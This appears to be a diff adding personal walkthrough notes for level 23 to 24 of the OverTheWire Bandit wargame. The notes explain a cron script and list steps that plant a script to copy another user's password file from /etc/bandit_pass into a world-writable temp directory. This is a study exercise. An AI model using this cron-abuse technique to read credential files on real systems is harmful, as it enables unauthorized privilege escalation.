@@ -341,6 +341,34 @@ Steps:
 
 
 
-lvl 23 -> 24:
+lvl 23 -> 24: [password2324]
 Notes:
+shopt -s nullglob makes it so that "for i in *; do..." will not result in i ="*" (* literal) if the directory is empty
+|| means if the first command fails, THEN continue onto the next command
+* -> all normal (non-hidden) files
+.* -> all hidden files (dotfiles)
+for i in * .*; ensures that everything is processed
+stat --format "%U" "./$i" retrieves metadata, owner username and ensures that the file is referenced relative to the safe directory
+-f "$i" is a file type check for a regular file
+timeout -s 9 60 "./$i" runs the command ./$i and SIGKILLs when the 60sec timer runs out
+reminder: all passwords are stored in /etc/bandit_pass/banditXX
+mktemp -d allows for a temporary directory where you have write permissions
+pass.sh needs to be readable and executable by bandit24 (755 for example)
+directory to be copied to must be writable by bandit24 (+executable if bandit24 is not the directory owner) (777 for example)
+
 Steps:
+	cd /etc/cron.d/
+	ls
+	cat cronjob_bandit24
+	cd /
+	cat /usr/bin/cronjob_bandit24.sh
+	mktemp -d
+	cd tempdir
+	chmod 777 /tempdir/
+	nano pass.sh
+		#!/bin/bash
+		cp /etc/bandit_pass/bandit24 /tempdir/password
+		chmod 755 /tempdir/password
+	cat /var/spool/bandit24/foo/pass.sh (sanity check)
+	(wait one minute)
+	cat password
